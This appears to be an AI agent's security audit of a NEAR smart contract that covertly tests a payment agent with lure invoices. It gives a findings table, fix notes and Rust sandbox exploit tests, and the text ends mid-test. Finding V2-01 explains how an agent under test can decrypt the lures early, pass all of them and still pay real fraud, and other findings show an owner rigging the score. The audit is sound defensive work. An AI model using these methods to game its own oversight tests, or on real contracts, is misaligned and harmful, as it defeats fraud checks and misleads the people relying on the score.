# 25. Security audit v2: Secret Shopper vault contract

Date: 2026-11-01. Auditor: security-auditor agent. Target: `contracts/shop/src/lib.rs` (1444 lines), wasm `target/near/secret_shopper.wasm` sha256 `1fe6dd5518faaa56b9143ea2b909400c669e504cb2ddbbbac3fe6e23cf0b9d18` (rebuilt from source in the scratch copy with `cargo near build non-reproducible-wasm`: byte-identical). Design: `24_contract_v2_design.md`. Prior audit: `21_security_audit.md`. No repo file was modified.

## 0. Method and result

| Item | Detail |
|:-|:-|
| Scratch copy | `.../scratchpad/audit-v2` (crate, wasm, `tests/fixtures/ft/target/near/fungible_token.wasm`) |
| Exploit suite | `tests/audit_v2.rs` (Appendix A), cargo test target `audit_v2`: **12 passed, 0 failed**, 44 s, two consecutive runs |
| Baseline | cargo test target `sandbox` in the scratch copy: 20 passed |
| References | NEAR security: [storage](https://docs.near.org/smart-contracts/security/storage) ("Measure the bytes written and require the attached deposit to cover them"), [frontrunning](https://docs.near.org/smart-contracts/security/frontrunning) (commit-reveal), [callbacks](https://docs.near.org/smart-contracts/security/callbacks); [OWASP WSTG business logic](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/README) (BUSL-04 process timing, BUSL-09 circumvention of workflows); drand quicknet chain info fetched from `api.drand.sh/52db9ba7...e971/info`: genesis 1692803367, period 3, matches `lib.rs:20-21` |

Status legend: **CONFIRMED** = a passing exploit test in Appendix A. **PLAUSIBLE** = follows from the code path, not exercised.

No path was found that moves vault funds outside the documented limits, calls an owner method or callback with the agent key, or lets the vendor arm a key alone. The new findings are about the integrity of the score, which is the product.

## 1. Findings

| ID | Severity | File:line | Description | Exploit | Status | Minimal fix |
|:-|:-|:-|:-|:-|:-|:-|
| V2-01 | High | `lib.rs:866-869`; tester `backend/src/tester/workers.ts:251` | `tlock_round` is only bounded from above (`<= round_at(expires_at)`), so every preimage becomes public before the decision window (`at <= expires_at`, `lib.rs:938`) closes. The tester's own round opens 0 to about 6 s before expiry; the contract also accepts a round 2 rounds after commit | Agent holds every suspicious invoice until the end of the batch window, decrypts the published ciphertexts at the round, declines exactly the lures with pre-signed txs, pays the rest. Every lure `Passed`, zero fraud control. Reopens v1 SS-C04 | CONFIRMED (`v01_*`: round opening 54 s before expiry accepted, decline after the round scored `Passed`; tester formula measured 1 to 2 s early in sandbox) | `require!(s.tlock_round > drand_round_at(expires_at.0) && s.tlock_round <= drand_round_at(expires_at.0 + reveal_grace))`; tester targets `round_at(now + ttl + margin)` with margin above commit latency plus 3 s |
| V2-02 | Medium | `lib.rs:975-984`, `lib.rs:1151` | `Unanswered` now counts against the agent (my v1 SS-C04 recommendation), but delivery is not provable on chain. The owner can commit lures it never delivers. With a shared payee, first-reveal-wins (`lib.rs:950-951, 986-989`) also lets the revealer pick which slot scores | Owner commits (P, I1) delivered and (P, I2) never delivered. Agent declines I1. Owner reveals I2 first: `Unanswered`; I1: `Invalid` (reused payee). A perfect agent scores 0 bps | CONFIRMED (`v02_*`) | On-chain delivery proof: the release tick (B3) posts a Merkle root of every released item via an owner FC call; a non-void reveal must carry an inclusion proof in a root posted in `[committed_at, expires_at - min_answer]`, else `Invalid` **2.2.0: ordering half fixed.** Outcomes are keyed by the agent decision they rest on (`scored_decisions`; a touched payee records the invoice that first touched it), and `Unanswered`/`Misdirected` consume nothing, so reveal order cannot pick the outcome. Test `reveal_order_cannot_pick_the_outcome`. **2.3.0: delivery half fixed, V2-02 closed.** The tester posts a Merkle root per release tick (`release`), the agent key signs the root it recomputed (`ack`), and `reveal(.., delivery)` or the permissionless `prove_delivery` upgrades an undecided lure from `Unanswered` to `Ignored` (scored as not passed, never demoting) only under the `check_delivery` rules: tick in `[committed_at, expires_at - min_answer]`, matching ack by the current agent key in time, no decision on the invoice, no freeze in the window, valid inclusion proof. `Unanswered` without a proof stays out of the score. Design v2/32, follow-up audit v2/33 (V23-02 to V23-07 below). Tests `delivered_and_acked_lure_is_ignored_and_scored`, `delivery_needs_a_timely_matching_ack`, `v23_owner_cannot_frame_ignored`, `v23_freeze_after_ack_cannot_score_ignored` |
| V2-03 | Medium | `lib.rs:954` | Approval is evaluated at reveal time (`self.approved.contains_key`, pending entries included), not at decision time. Listing a lure payee at any point before its reveal turns the slot `Invalid`; `remove_payee` afterwards leaves no state trace | (a) Owner discards passes: agent declines L1 and pays L2; owner lists L1's payee (pending, active in 1 h), reveals L1 `Invalid`, delists. Score 0 instead of 5000 bps. (b) Owner hides a failure (collusion): lists the paid lure's payee, reveal `Invalid`, no demotion, delists. Visible only as `payee_added`/`payee_removed` events and `stats.invalid` | CONFIRMED (`v03_*`, `v05_*`) | Append-only `listed_at: LookupMap<AccountId, u64>` (first `add_payee`, never cleared). Reveal is `Invalid` only if `listed_at <= decision time` (or `<= committed_at` for slots without a decision). Listing after the decision changes nothing |
| V2-04 | Medium | `lib.rs:627-636`, `lib.rs:666`, `lib.rs:611-618` | `remove_payee` is immediate and `pay` cannot require approval atomically; the harness checks `get_payee_status` then signs `pay` (TOCTOU). `add_payee` on an existing entry also resets `active_at` | Owner commits (newvendor, never-delivered invoice), lists newvendor, delivers its real invoice, delists it just before the agent's `pay` lands. `pay` succeeds with `payee_approved=false`; reveal `Failed`, mode `Demoted`. v1 SS-C02 framing with one extra step | CONFIRMED (`v04_*`) | Same `listed_at` rule as V2-03 (ever listed before the decision means `Invalid`), plus `pay(.., require_listed: Option<bool>)` that panics if not `is_approved` now, set by the harness when it pays a listed payee |
| V2-05 | Low | `lib.rs:847-849`, `lib.rs:841` | `ciphertexts` is optional and never hashed; `ciphertext_sha256` is stored unchecked. The tlock guarantee (owner cannot withhold) is not enforced by the contract | Owner commits junk or no ciphertexts; nobody can decrypt, passes stay unrevealed (`overdue_unrevealed`), failures are revealed by the owner. Detectable only off chain | CONFIRMED (`v06_*`) | `ciphertexts: Vec<Base64VecU8>` required; `require!(env::sha256_array(&c.0) == hex32(&s.ciphertext_sha256, ..))`; optionally check the age header `-> tlock <round> 52db..e971` in the first 200 bytes **2.1.0: fixed** as recommended: ciphertexts required (`Vec<Base64VecU8>`), at most 2048 B, header `age-encryption.org/v1\n-> tlock <slot round> <quicknet hash>\n`, on-chain sha256. +0.3 Tgas per K=3 batch. Decryptability itself is still only provable at the round (keeper flags sabotage). Test `ciphertexts_are_checked_on_chain` |
| V2-06 | Low | `lib.rs:841-905`, `lib.rs:1143` | `commit_batch` has no deposit and the vault pays its storage: 1039 B (0.0104 NEAR) per K=3 batch. The owner FC key on the tester host can call it every `batch_interval`. `get_scorecard` is O(batches): 73.5 Ggas per batch, 300 Tgas view limit at about 4083 batches | A leaked tester key burns vault NEAR about 20x its gas, until agent payments fail for storage. An owner can also spam batches to make `get_scorecard` unreadable and hide the score | CONFIRMED (`v07_*`, numbers measured) | Agent-independent reserve check in `commit_batch` (`free >= min_near_float`); enforce a minimum `batch_interval` in `new`; keep a `first_open_batch` cursor so the scorecard walks open batches only **Mitigated in 2.1.0:** `commit_batch` cannot spend the reveal float (`assert_float`), and `get_scorecard` walks only open batches (`open_from`). Owner-funded batch storage stays by design |
| V2-07 | Low | `lib.rs:738`, `lib.rs:667-674`, `lib.rs:692` | `propose` records the payee in `payees`, so after re-arming that payee is "known": `pay` skips the new-payee limit and skips `storage_deposit` | A demoted agent proposes 6 attacker accounts (all rejected); they self-register on the token; after re-arm the agent pays all 6 in one day with `max_new_payees_per_day = 5`. A proposed, unregistered real payee can never be paid (status `Failed`) | CONFIRMED (`v08_*`) | Add `paid: bool` to `PayeeSeen`; count a payee as new until the agent has paid it once; register whenever `!paid` (NEP-145 refunds an already registered account) |
| V2-08 | Low | `lib.rs:955` | Once a payee was paid while listed, every later slot on it is `Invalid` forever, even after `remove_payee`. Paying a delisted (for example compromised) account can never be tested | Owner lists oldbank, agent pays, owner delists; a later lure on oldbank paid by the agent reveals `Invalid`, mode stays `Armed` | CONFIRMED (`v12_*`) | With `listed_at` plus `removed_at`, score a decision made after `removed_at` normally; or document it as untestable **2.3.0: fixed.** A slot is `Invalid` if its payee was listed at `committed_at` (`active_at <= committed_at < removed_at`), if the agent paid or proposed it under the lure invoice while listed (`payee_approved`), or if the agent touched it unlisted before `committed_at`. `PayeeSeen` keeps the first touch, but the agent's first unlisted touch replaces a record made only while listed (an owner approval never does), so a delisted vendor scores normally: paying it after the commit is `Failed`, declining is `Passed`, and an unlisted payment between delisting and commit still makes it `Invalid`. Listing edits after the commit can only set `active_at` and `removed_at` later than `committed_at`, so they never void a slot (V2-03 stays closed). Sandbox test `delisted_payee_can_be_tested` |
| V2-09 | Low | `lib.rs:908-1036`, `lib.rs:695-714` | Reveal storage (545 B per scored reveal) is paid by the vault from a permissionless call; a decline now writes only 177 B. `min_near_float` is checked only in `withdraw_near`. v1 noted reveals could not be blocked because declines were larger than reveals; that ordering has flipped | After the owner withdraws to the float, the agent spends 50 declines per day (about 0.1 NEAR/day incl. gas) for about 5 days, then right after paying a lure sends a few declines to push free NEAR under 545 B: the failure reveal fails with `LackBalanceForState` until someone tops up | PLAUSIBLE (byte and gas numbers CONFIRMED in `verify_*`) | `assert_reserve()` in `pay`, `decline`, `propose`: `account_balance - storage_cost >= min_near_float`, so the float stays for reveals **2.1.0: fixed.** `pay`, `decline`, `propose` and `commit_batch` require `account_balance >= storage cost + min_near_float`, so only `reveal` (and owner top-ups) can use the float. Unit test `agent_writes_cannot_spend_the_reveal_float` |
| V2-10 | Low | `lib.rs:1239-1246`, `lib.rs:668-674`, `lib.rs:1196-1200` | `new_payees_today` and `decisions_today` still reset at UTC midnight (v1 SS-C07 fixed only for cap and payment count) | 2x new payees and 2x decisions across midnight | PLAUSIBLE (sandbox cannot cross a UTC day cheaply) | Rolling windows like `spend_window`, or document 2x. **2.1.0: new payees fixed** (flag on each `spend_window` mark, same rolling 24 h; a failed transfer keeps its new-payee mark with amount 0 so it cannot launder a payee). Unit tests `new_payee_limit_spans_utc_midnight` (fails against the old UTC-day count) and `failed_transfer_does_not_launder_a_new_payee`. `decisions_today` stays a UTC-day storage bound, documented |
| V2-11 | Info | `lib.rs:976-983` | Paying an approved payee under the lure invoice id scores `Passed` | Agent pays a fake invoice to the real vendor: money leaves, score says pass | CONFIRMED (`v09_*`) | Separate outcome (for example `PaidKnown`) or `Invalid`; at least document it **2.1.0: fixed, and wider than reported:** paying or proposing the lure invoice to *any* payee other than the lure's (listed vendor or unknown account) was `Passed`. It is now `Misdirected`: shown in `stats.misdirected`, never scored and never demoting, because the owner sees real invoice ids first and could otherwise commit a slot on a real invoice and frame a legitimate payment. Sandbox test `paying_a_lure_invoice_to_another_payee_is_misdirected` |
| V2-12 | Info | `lib.rs:571-582` | A mixed `set_limits` (one field tighter, one looser) queues all fields, so the tightening waits `limits_delay` | Owner lowers `max_per_payment` and raises `daily_cap` in one call; the agent can still pay the old maximum for an hour | CONFIRMED (`v10_*`) | Apply tighter fields now, queue only looser ones **2.1.0: fixed.** Tighter fields apply at once (field-wise minimum), only the full target is queued. Asserted in `loosening_limits_waits_tightening_is_instant` |
| V2-13 | Info | `lib.rs:536`, `lib.rs:832`, `lib.rs:1409` | `AgentArmed`, `AgentDemoted`, `NearWithdrawn` are still emitted before their receipts run (v1 SS-C09 fixed only for `Withdrawn`) | Indexer shows a key change or NEAR withdrawal that may have failed | PLAUSIBLE | Document as intent events or emit from a callback **2.2.0: fixed.** `agent_armed`, `near_withdrawn` and the new `agent_key_changed` come from `#[private]` callbacks with an `ok` field. `agent_demoted` stays in the reveal receipt because the authority cut is synchronous. A failed arming restores the prior mode; a failed key change sets `stale_key`, which anyone can repair with `resync_key`; a failed `withdraw_near` refunds the vault. Tests `key_and_withdraw_events_come_from_callbacks`, `failed_key_actions_report_ok_false_and_resync_restores`, `failed_near_withdrawal_reports_ok_false_and_refunds` |
| V2-14 | Info | `lib.rs:1057` | Intents partial use still settles `Failed` and refunds the full amount to the rolling cap (v1 SS-C12 not fixed) | Only if the receiver ever keeps part of a deposit | PLAUSIBLE | Refund `amount - used` **2.2.0: fixed.** `settle` takes the amount that left the vault: the rest goes back to the cap, the kept part stays and counts in `paid_total`. Unit test `partial_intents_use_stays_on_the_cap` |

## 2. v1 fix verification

| v1 ID | Claimed fix | Verdict | Evidence / bypass |
|:-|:-|:-|:-|
| SS-C01 one decision scored many times | Duplicate commitments rejected; scored payee and invoice sets | **Fixed** (ordering fixed in 2.2.0) | `duplicate_commitment_rejected`, `one_decision_scores_once`, `reveal_order_cannot_pick_the_outcome` pass |
| SS-C02 owner frames a legit payment | On-chain approved payees with delay; Invalid if approved | **Partially fixed** | Direct case closed (`approved_payee_can_never_fail_a_test`). Bypass: delist between the agent's check and `pay` (V2-04). Approval read at reveal time enables V2-03 |
| SS-C03 banked failure demotes a new key | Demote only if decision key == `agent_key` and decision after `armed_at` | **Fixed** | Same-key re-arm covered by `withheld_failure_does_not_demote_a_new_arming`; touched path also binds `s.key` and `armed_at` (`lib.rs:969, 972`). No bypass found. Under the same arming the owner can still time a deserved demotion (by design; keepers can reveal at the tlock round) |
| SS-C04 decision timing unbounded, no answer free | Window `[committed_at, expires_at]`; Unanswered in the score | **Fixed as written, bypassed** | `late_decision_counts_as_unanswered` passes. Bypass: tlock opens inside the window (V2-01). Regression: undelivered lures (V2-02) |
| SS-C05 agent storage drain | Reason not stored, 140 B cap, `max_decisions_per_day`, `withdraw_near` | **Fixed** | Max decline: 177 B, 2.11 Tgas; 141-byte reason rejected; 51st decision rejected (`verify_*`). Residual V2-09 |
| SS-C06 unbounded scorecard | Per-batch counters | **Partially fixed** | O(slots) became O(batches): 73.5 Ggas per batch, about 4083 batches to 300 Tgas (V2-06) |
| SS-C07 calendar-day cap | Rolling `spend_window`, `max_payments_per_day` | **Fixed** for spend and count | New-payee and decision counters still calendar (V2-10) |
| SS-C08 contained failures leave the rate | `failed_contained` in the denominator | **Fixed** | `lib.rs:1151` |
| SS-C09 events before effects | `Withdrawn` from callback | **Fixed** for `Withdrawn` | Failed withdraw logs `"ok":false` (`verify_*`); V2-13 for the rest |
| SS-C10 public init | `#[init] #[private]` | **Fixed** | `stranger_key_cannot_pay` checks a stranger `new` fails |
| SS-C11 no NEAR withdraw | `withdraw_near` above storage + float | **Fixed** | `owner_can_withdraw_free_near_only`; reserve math checked below |
| SS-C12 intents partial | none | **Not fixed** | V2-14 |

## 3. Details for confirmed Medium and High items

### V2-01 [High] The timelock opens before the decision window closes

The commit-reveal's purpose is that nobody learns a test before it stops mattering ([NEAR frontrunning](https://docs.near.org/smart-contracts/security/frontrunning)). Here it stops mattering at `expires_at` (`in_window`, `lib.rs:938`), but the bound at `lib.rs:866-869` only says the round must open **by** expiry. The tester picks `drandRoundAt(Date.now() + ttlMs)`, published in `(now + ttl - 3 s, now + ttl]`, while `expires_at = block_time + ttl` is later by the commit latency. Gap: about 1 to 6 s in production; 1 to 2 s measured in sandbox. NEAR blocks are about 1 s and the agent can pre-sign one decline per held invoice, so it only needs to broadcast after decrypting.

Reproduction (`v01_*`): commit with `round_at(now) + 2` (accepted; opens 54 s before expiry), wait for the round, decline the lure, wait for expiry, reveal: `Passed`. Second batch with the tester formula: round opens 1 to 2 s before expiry.

Impact: an agent that delays suspicious invoices to the end of each batch window learns which are lures and passes all of them, while paying real fraud. This is the same class as v1 SS-B01 (covert test defeated).

Fix: lower bound strictly after expiry, upper bound within the reveal grace:
```rust
let open = drand_round_at(expires_at.0);
let last = drand_round_at(expires_at.0.saturating_add(self.policy.reveal_grace.0));
require!(s.tlock_round > open && s.tlock_round <= last, "tlock round must open after expiry");
```
Tester: `round = drandRoundAt(Date.now() + ttlMs + 10_000)`, and `reveal_grace >= 30 s`.

### V2-02 [Medium] Undelivered lures are charged to the agent

`reveal` cannot tell "agent did not answer" from "owner never delivered". Before v2 this favoured the agent (SS-C04); now it favours the owner. The receipt hash binds generation, not delivery. Reproduction in `v02_*`. Impact: any vendor's published score can be pushed to 0 with no on-chain evidence of wrongdoing; the only defence is off-chain inbox logs the owner controls.

Fix: make delivery a chain fact without revealing which items are tests. B3 release ticks already batch every inbox item; post `release(root, count)` per tick (owner FC key, padded tree so count leaks nothing), and require `reveal(.., proof)` for non-void slots to prove `leaf = sha256(invoice_id)` in a root posted inside `[committed_at, expires_at - min_answer]`; otherwise `Invalid`. Until then, keep `Unanswered` out of the headline and show it next to it.

### V2-03 [Medium] Approval read at reveal time lets the owner choose outcomes

`lib.rs:954` checks the approved list as it is at reveal, including entries not yet active. Both directions are confirmed: discarding a pass (`v03_*`, score 5000 to 0 bps) and hiding a failure (`v05_*`, no demotion). After `remove_payee` the only trace is the event log; `get_payee_status` returns null and the decision shows `payee_approved: false`. The fix in the table (append-only `listed_at`, compared with the decision time) also closes V2-04.

### V2-04 [Medium] Delisting race frames an approved payment

`pay` re-checks nothing the agent can pin, and `remove_payee` has no delay while `add_payee` does. The owner controls invoice delivery, so it knows when the agent will act. Reproduction (`v04_*`): list, agent reads `get_payee_status` (active), owner delists, agent pays, reveal `Failed`, `Demoted`. Visible afterwards as a `payee_removed` event one block before the `paid` event, but the contract scores and demotes automatically.

## 4. Checks that held

| Area | Check | Result |
|:-|:-|:-|
| Spend window refunds | `settle` runs once per payment (one `#[private]` callback per promise chain); two payments with equal `(at, amount)` have interchangeable marks, so removing either is correct; owner payments push no mark | No double refund |
| `max_payments_per_day` | Counted on the pruned window before push; failed transfers free a slot | Correct |
| `set_limits` | Equal values count as tighter and cancel a pending loosen (usable as a cancel); a tighten clears a pending loosen; a second loosen resets `effective_at` | Correct (V2-12 is usability) |
| `apply_limits` by anyone | Can only apply what the owner queued after its delay | Harmless |
| `withdraw_near` reserve | Attached deposits (storage_deposit) leave `account_balance` when the receipt is created; refunds only add to it later. `storage_byte_cost * storage_usage + min_near_float` is a sound floor at call time | No race |
| drand bounds | Constants match chain info; rounds equal to the current round are rejected (`>`), so a round is never already public at commit | Correct (V2-01 is the lower bound on the other side) |
| Key binding | `demote_key` from the decision or the first touch, gated by `armed_at`; same public key re-armed after freeze does not inherit old failures | Holds |
| Scored sets poisoning | Inserted only by non-`Invalid` reveals, which need the preimage; the agent cannot add entries; the owner can only invalidate its own future tests | Holds (ordering in V2-02) |
| Vendor dodging via approval | Only the owner can `add_payee` (1 yocto, predecessor check); the agent has no path to `approved` | Holds; owner-side abuse is V2-03 |
| Agent dodging via pre-commit touch | Lure payees are fresh keys; `seen.at < committed_at` needs the payee before the commit | Holds |
| `get_payees` | `IterableMap::iter().skip()` uses `nth`, O(1) per skip (near-sdk 5.29.1 `store/iterable_map/iter.rs:76`); page capped at 100 | Holds |
| Harness pending payees | `agent/src/vendor.ts:19` filters `active_at <= now` | Holds |
| Callbacks and FC keys | `on_paid*`, `on_withdrawn` are `#[private]` and absent from `pay,decline` and `propose,decline` | Holds (`fc_key_cannot_call_other_methods`) |
| Init | `#[init] #[private]`; re-init fails on existing state | Holds |
| Overflow | `overflow-checks = true`; `checked_add` on spend; `saturating_*` on time | Holds |
| Reproducibility | Rebuilt wasm byte-identical to the shipped artifact | Holds |

## 5. Priority before the Nov 5 freeze

1. V2-01: one-line bound change plus the tester round margin. Without it the timelock defeats the test.
2. V2-03 and V2-04: one `listed_at` map and the decision-time rule; add `require_listed` to `pay`.
3. V2-02: decide between on-chain delivery roots and taking `Unanswered` out of the headline.
4. V2-05, V2-07, V2-09: hash check on ciphertexts, `paid` flag on payees, reserve check on agent writes.

## Appendix A. Exploit tests (`tests/audit_v2.rs`, 12 passing)

Run from the scratch copy after `cargo near build non-reproducible-wasm`, then run the cargo test target `audit_v2` with output capture off.

Measured output:
```
round 33573763 publishes at 1793524653 s, expiry 1793524708 s: 55 s of window left
tester round publishes 2 s before expiry
20 batches: +20780 bytes (1039 B/batch, 10390000000000000000000 yoctoNEAR locked/batch); get_scorecard 1378759714912 -> 2848005728574 gas, 73462300683 gas/batch, 300 Tgas at ~4083 batches
one max decline: 177 bytes, gas 2110721220816
one scored reveal: 545 bytes
test result: ok. 12 passed; 0 failed
```

```rust
// Audit v2 exploit tests (v2/25_security_audit_v2.md). Each test passes only if the weakness is real.
use near_workspaces::network::Sandbox;
use near_workspaces::types::{AccessKey, Gas, KeyType, NearToken, PublicKey, SecretKey};
use near_workspaces::{Account, Contract, Worker};
use serde_json::{json, Value};
use sha2::{Digest, Sha256};

const USDC: u128 = 1_000_000;
const YOCTO: NearToken = NearToken::from_yoctonear(1);
const G: u64 = 1_692_803_367; // drand quicknet genesis
const RECEIPT: [u8; 32] = [0x5e; 32];
const BYTE_COST: u128 = 10_000_000_000_000_000_000;

struct Env {
    worker: Worker<Sandbox>,
    shop: Contract,
    ft: Contract,
    owner: Account,
    vendor: Account,
    agent: Account,
    agent_pk: PublicKey,
}

#[derive(Clone, Copy)]
struct Opts {
    ttl_s: u64,
    cooldown_s: u64,
    payee_delay_s: u64,
}

impl Default for Opts {
    fn default() -> Self {
        Self { ttl_s: 60, cooldown_s: 1, payee_delay_s: 0 }
    }
}

fn policy(o: &Opts) -> Value {
    let s = |x: u64| (x * 1_000_000_000).to_string();
    json!({
        "daily_cap": (5 * USDC).to_string(), "max_per_payment": (2 * USDC).to_string(),
        "max_new_payees_per_day": 5, "max_payments_per_day": 20, "max_decisions_per_day": 50,
        "batch_size": 3, "batch_interval": "1", "test_ttl": s(o.ttl_s),
        "reveal_grace": s(1), "rearm_cooldown": s(o.cooldown_s),
        "payee_delay": s(o.payee_delay_s), "limits_delay": s(3600),
        "key_allowance": "1000000000000000000000000", "storage_deposit": "1250000000000000000000",
        "min_near_float": "500000000000000000000000"
    })
}

fn round_at(t_s: u64) -> u64 {
    (t_s - G) / 3 + 1
}

fn publish_s(round: u64) -> u64 {
    G + (round - 1) * 3
}

fn inv(n: u8) -> ([u8; 32], String) {
    ([n; 32], hex::encode([n; 32]))
}

fn implicit(c: char) -> String {
    c.to_string().repeat(64)
}

struct Slot {
    salt: [u8; 32],
    payee: String,
    invoice: [u8; 32],
    receipt: [u8; 32],
}

impl Slot {
    fn lure(seed: u8, payee: &str, invoice: [u8; 32]) -> Self {
        Self { salt: [seed; 32], payee: payee.into(), invoice, receipt: RECEIPT }
    }
    fn void(seed: u8) -> Self {
        Self { salt: [seed; 32], payee: String::new(), invoice: [seed; 32], receipt: [0; 32] }
    }
    fn commitment(&self) -> String {
        let mut h = Sha256::new();
        h.update(self.salt);
        h.update([self.payee.len() as u8]);
        h.update(self.payee.as_bytes());
        h.update(self.invoice);
        h.update(self.receipt);
        hex::encode(h.finalize())
    }
}

async fn setup(o: Opts) -> anyhow::Result<Env> {
    let worker = near_workspaces::sandbox().await?;
    let owner = worker.dev_create_account().await?;
    let vendor = worker.dev_create_account().await?;
    let ft = worker
        .dev_deploy(&std::fs::read("tests/fixtures/ft/target/near/fungible_token.wasm")?)
        .await?;
    ft.call("new_default_meta")
        .args_json(json!({ "owner_id": owner.id(), "total_supply": (1_000 * USDC).to_string() }))
        .transact()
        .await?
        .into_result()?;
    let shop_acc = worker.dev_create_account().await?;
    let shop = shop_acc
        .deploy(&std::fs::read("target/near/secret_shopper.wasm")?)
        .await?
        .into_result()?;
    shop.call("new")
        .args_json(json!({
            "owner_id": owner.id(), "vendor_id": vendor.id(), "token_id": ft.id(),
            "intents_id": null, "policy": policy(&o)
        }))
        .transact()
        .await?
        .into_result()?;
    owner
        .call(ft.id(), "storage_deposit")
        .args_json(json!({ "account_id": shop.id() }))
        .deposit(NearToken::from_millinear(10))
        .transact()
        .await?
        .into_result()?;
    owner
        .call(ft.id(), "ft_transfer")
        .args_json(json!({ "receiver_id": shop.id(), "amount": (100 * USDC).to_string() }))
        .deposit(YOCTO)
        .transact()
        .await?
        .into_result()?;
    let fak = shop_acc.secret_key().public_key();
    shop_acc.batch(shop.id()).delete_key(fak).transact().await?.into_result()?;
    let agent_sk = SecretKey::from_random(KeyType::ED25519);
    let agent_pk = agent_sk.public_key();
    arm(&owner, &vendor, &shop, &agent_pk).await?;
    let agent = Account::from_secret_key(shop.id().clone(), agent_sk, &worker);
    Ok(Env { worker, shop, ft, owner, vendor, agent, agent_pk })
}

async fn arm(owner: &Account, vendor: &Account, shop: &Contract, pk: &PublicKey) -> anyhow::Result<()> {
    owner.call(shop.id(), "propose_key").args_json(json!({ "public_key": pk })).deposit(YOCTO).transact().await?.into_result()?;
    vendor.call(shop.id(), "accept_key").args_json(json!({ "public_key": pk })).deposit(YOCTO).transact().await?.into_result()?;
    Ok(())
}

async fn agent_call(e: &Env, method: &str, args: Value) -> bool {
    let r = e.agent.call(e.shop.id(), method).args_json(args).gas(Gas::from_tgas(80)).transact().await;
    matches!(r, Ok(ref x) if x.is_success())
}

async fn pay(e: &Env, invoice_id: &str, payee: &str, amount: u128) -> bool {
    agent_call(e, "pay", json!({ "invoice_id": invoice_id, "payee": payee, "amount": amount.to_string() })).await
}

async fn decline(e: &Env, invoice_id: &str) -> bool {
    agent_call(e, "decline", json!({ "invoice_id": invoice_id, "reason": "payee not on vendor record" })).await
}

async fn owner_call(e: &Env, method: &str, args: Value) -> anyhow::Result<bool> {
    let r = e.owner.call(e.shop.id(), method).args_json(args).deposit(YOCTO).gas(Gas::from_tgas(100)).transact().await?;
    Ok(r.is_success())
}

async fn view(e: &Env, method: &str, args: Value) -> anyhow::Result<Value> {
    Ok(e.shop.view(method).args_json(args).await?.json()?)
}

async fn scorecard(e: &Env) -> anyhow::Result<Value> {
    view(e, "get_scorecard", json!({})).await
}

async fn now_s(e: &Env) -> anyhow::Result<u64> {
    Ok(scorecard(e).await?["now"].as_str().unwrap().parse::<u64>()? / 1_000_000_000)
}

async fn wait_until(e: &Env, target_s: u64) -> anyhow::Result<()> {
    for _ in 0..400 {
        if now_s(e).await? >= target_s {
            return Ok(());
        }
        e.worker.fast_forward(20).await?;
    }
    anyhow::bail!("chain time did not reach {target_s}")
}

fn slot_input(s: &Slot, round: u64) -> Value {
    json!({ "commitment": s.commitment(), "tlock_round": round, "ciphertext_sha256": hex::encode([0xcc; 32]) })
}

async fn commit_by(by: &Account, e: &Env, slots: &[Slot], round: u64, ciphertexts: Option<Vec<String>>) -> anyhow::Result<u32> {
    let input: Vec<Value> = slots.iter().map(|s| slot_input(s, round)).collect();
    Ok(by
        .call(e.shop.id(), "commit_batch")
        .args_json(json!({ "slots": input, "ciphertexts": ciphertexts }))
        .gas(Gas::from_tgas(100))
        .transact()
        .await?
        .into_result()?
        .json()?)
}

// Same round choice as backend/src/tester/workers.ts:251: round_at(now + ttl).
async fn commit(e: &Env, slots: &[Slot]) -> anyhow::Result<u32> {
    let ttl: u64 = view(e, "get_policy", json!({})).await?["test_ttl"].as_str().unwrap().parse::<u64>()? / 1_000_000_000;
    let round = round_at(now_s(e).await? + ttl);
    commit_by(&e.owner, e, slots, round, None).await
}

async fn reveal(e: &Env, slot_id: u32, s: &Slot) -> anyhow::Result<Result<String, String>> {
    let r = e
        .owner
        .call(e.shop.id(), "reveal")
        .args_json(json!({
            "slot_id": slot_id, "salt": hex::encode(s.salt), "payee": s.payee,
            "invoice_id": hex::encode(s.invoice), "receipt_hash": hex::encode(s.receipt)
        }))
        .gas(Gas::from_tgas(100))
        .transact()
        .await?;
    if r.is_success() {
        Ok(Ok(r.json::<String>()?))
    } else {
        Ok(Err(format!("{:?}", r.into_result().err())))
    }
}

async fn expires_s(e: &Env, slot: u32) -> anyhow::Result<u64> {
    let t = view(e, "get_test", json!({ "slot_id": slot })).await?;
    Ok(t["expires_at"].as_str().unwrap().parse::<u64>()? / 1_000_000_000)
}

// V2-01: the contract only bounds tlock_round from above (opens by expiry), so every preimage is public
// before the decision window closes. The agent decrypts at the round and declines exactly the lures in time.
#[tokio::test]
async fn v01_tlock_opens_inside_window_agent_declines_only_lures() -> anyhow::Result<()> {
    let e = setup(Opts { ttl_s: 60, ..Default::default() }).await?;
    let lure = Slot::lure(1, &implicit('a'), inv(1).0);
    let t0 = now_s(&e).await?;
    // Legal extreme: two rounds after now. The tester's own choice is checked below.
    let early = round_at(t0) + 2;
    let slot = commit_by(&e.owner, &e, &[Slot::lure(1, &implicit('a'), inv(1).0), Slot::void(2), Slot::void(3)], early, None).await?;
    let exp = expires_s(&e, slot).await?;
    println!("round {early} publishes at {} s, expiry {exp} s: {} s of window left", publish_s(early), exp - publish_s(early));
    assert!(publish_s(early) + 40 < exp, "accepted a round that opens 40+ s before expiry");

    wait_until(&e, publish_s(early)).await?;
    // drand has now published the round; anyone holding the ciphertext decrypts the preimage.
    let t = now_s(&e).await?;
    assert!(t < exp, "decision window still open");
    assert!(decline(&e, &hex::encode(lure.invoice)).await, "agent declines the decrypted lure");
    wait_until(&e, exp + 1).await?;
    assert_eq!(reveal(&e, slot, &lure).await?, Ok("Passed".into()));

    // The tester's formula round_at(now + ttl) also opens at or before expiry.
    let before = now_s(&e).await?;
    let tester_round = round_at(before + 60);
    let s2 = commit_by(&e.owner, &e, &[Slot::void(4), Slot::void(5), Slot::void(6)], tester_round, None).await?;
    let exp2 = expires_s(&e, s2).await?;
    println!("tester round publishes {} s before expiry", exp2 - publish_s(tester_round));
    assert!(publish_s(tester_round) <= exp2);
    Ok(())
}

// V2-02: Unanswered now counts against the agent, but delivery is not provable on chain. The owner commits
// a lure it never delivers; with a shared payee it also picks, after the fact, which slot scores.
#[tokio::test]
async fn v02_undelivered_lure_turns_a_pass_into_unanswered() -> anyhow::Result<()> {
    let e = setup(Opts { ttl_s: 20, ..Default::default() }).await?;
    let p = implicit('b');
    let delivered = Slot::lure(1, &p, inv(1).0);
    let ghost = Slot::lure(2, &p, inv(2).0); // never delivered
    let slot = commit(&e, &[Slot::lure(1, &p, inv(1).0), Slot::lure(2, &p, inv(2).0), Slot::void(3)]).await?;
